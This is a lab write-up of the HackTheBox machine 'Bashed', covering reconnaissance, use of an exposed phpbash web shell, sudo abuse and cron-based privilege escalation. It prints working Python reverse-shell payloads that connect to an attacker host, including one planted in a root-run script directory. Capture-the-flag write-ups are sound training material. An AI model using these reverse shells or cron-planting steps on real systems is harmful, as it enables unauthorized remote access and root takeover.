---
title: Bashed
tags:
  - HackTheBox
  - Easy
  - Linux
  - Web
  - Cron-Job
date: 2024-09-01T00:00:00Z
---
![](Pasted%20image%2020241101181907.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.10.68 bashed.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- bashed.htb > sC.txt

[redacted]
PORT   STATE SERVICE
80/tcp open  http
|_http-title: Arrexel's Development Site
```

So I took a look at the website:

![](Pasted%20image%2020241101182920.png)

It talks about a php script that creates a bash reverse shell from a php script. I took a look at the unique entry `phpbash`:

![](Pasted%20image%2020241101183046.png)

So as the author says that he used this script in this website, I decided to enumerate with [dirsearch 📁](/notes/tools/dirsearch.md) to try to find that script and use it:

```shell
dirsearch -e * -u http://bashed.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

[redacted]
[18:35:57] 301 -  309B  - /images  ->  http://bashed.htb/images/            
[18:35:59] 301 -  310B  - /uploads  ->  http://bashed.htb/uploads/          
[18:36:00] 301 -  306B  - /php  ->  http://bashed.htb/php/                  
[18:36:01] 301 -  306B  - /css  ->  http://bashed.htb/css/                  
[18:36:02] 301 -  306B  - /dev  ->  http://bashed.htb/dev/                  
[18:36:03] 301 -  305B  - /js  ->  http://bashed.htb/js/                    
[18:36:11] 301 -  308B  - /fonts  ->  http://bashed.htb/fonts/
```

So I took a look at the `/dev` subdirectory and found those scripts:

![](Pasted%20image%2020241101183906.png)

![](Pasted%20image%2020241101184013.png)

## Exploitation

I can execute commands, so I executed a python reverse shell (bash one didn't work):

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ATTACK",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

> I got a shell!

![](Pasted%20image%2020241101185037.png)

So I checked if I could read the user flag (success):

![](Pasted%20image%2020241101185124.png)

## Privilege escalation

If we run `sudo -l`:

![](Pasted%20image%2020241101190011.png)

So the user `www-data` can run commands as `scriptmanager` without password. So we can perform a `sudo -u scriptmanager bash -i` to become `scriptmanager`.

Now, after some enumeration I found the `/scripts` directory, which contained two files:

![](Pasted%20image%2020241101190509.png)

It seems that a privileged user is running the `test.py` each some time. So I created a `.shell.py`:

```shell
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.16",888))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```

> Got a reverse shell as root :D

![](Pasted%20image%2020241101192000.png)

==Machine pwned!==

